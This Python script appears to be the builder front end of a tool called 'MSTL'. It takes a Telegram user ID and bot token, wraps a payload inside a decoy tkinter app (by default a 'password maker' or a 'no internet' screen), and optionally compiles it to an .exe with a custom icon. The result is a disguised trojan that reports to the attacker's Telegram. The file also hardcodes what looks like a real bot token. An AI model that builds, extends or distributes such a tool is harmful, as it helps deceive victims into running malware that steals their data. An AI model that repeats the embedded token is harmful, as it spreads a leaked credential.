# Writed by Unknow-per(https://www.github.com/Unknow-per)
# MSTL Bot Normal Token: 6622962602:AAERgZlXugMGZIA5vqkIpv5KKAAsDUrA6is
from modules import banner, make
banner.init()
banner.banner()
banner.check_update()
try: 
    id = str(input(banner.Fore.GREEN + "[+]" + banner.Fore.WHITE + " write your telegram user id(with @userinfobot): "))
    tok = str(input(banner.Fore.GREEN + "[+]" + banner.Fore.WHITE + " If you want to use custome token write C if not press enter: ")).lower()
    if tok == "c":
        token = input("Write your bot token: ")
    else: 
        token = "6622962602:AAERgZlXugMGZIA5vqkIpv5KKAAsDUrA6is"
    name = str(input(banner.Fore.GREEN + "[+]" + banner.Fore.WHITE + " If you want to use custome name write C if not press enter: ")).lower()
    if name == "c": 
        name = input("Write your app name(ex: mstl): ")
    else: 
        name = "mstl"
    icon = str(input(banner.Fore.GREEN + "[+]" + banner.Fore.WHITE + " If you want to use custome icon write C if not press enter: ")).lower()    
    if icon == "c":
        icon = input("write your icon file address(.ico file): ")
        if icon.endswith(".ico"): pass
    else: 
        icon = "icongallery/icon.ico"
    code_addr = str(input(banner.Fore.GREEN + "[+]" + banner.Fore.WHITE + " If you want to use your custome tkinter code write C if not press enter: ")).lower()    
    if code_addr == "c":
        code_addr = input("write your code address(.py file): ")
        if code_addr.endswith(".py"): pass
    else: 
        code_addr = "builder/tk_payloads/password_maker.py"
    offline_code_addr = str(input(banner.Fore.GREEN + "[+]" + banner.Fore.WHITE + " If you want to use your custome offline tkinter code write C if not press enter: ")).lower()    
    if offline_code_addr == "c":
        offline_code_addr = input("write your code address(.py file): ")
        if code_addr.endswith(".py"): pass
    else: 
        offline_code_addr = "builder/tk_payloads/offline/no_internet.py"
    make.make_python(ID=id, TOKEN=token, NAME=name, CODE_ADDR=code_addr, OFFLINE_CODE_ADDR=offline_code_addr)
    opt = input(banner.Fore.YELLOW + "Make it exe(Y for yes and N for no)? " + banner.Fore.RESET).lower()
    if opt == "y": 
        make.make_exe(NAME=name, ICON=icon)
    else: 
        exit(banner.Fore.CYAN + "\n\n Good Luck \n\n" + banner.Fore.RESET)
except ValueError: print(banner.Fore.RED + "You must write str."), exit()
except KeyboardInterrupt: exit(f"\n\n\{banner.Fore.CYAN}nGood Luck{banner.Style.RESET_ALL}\n\n")
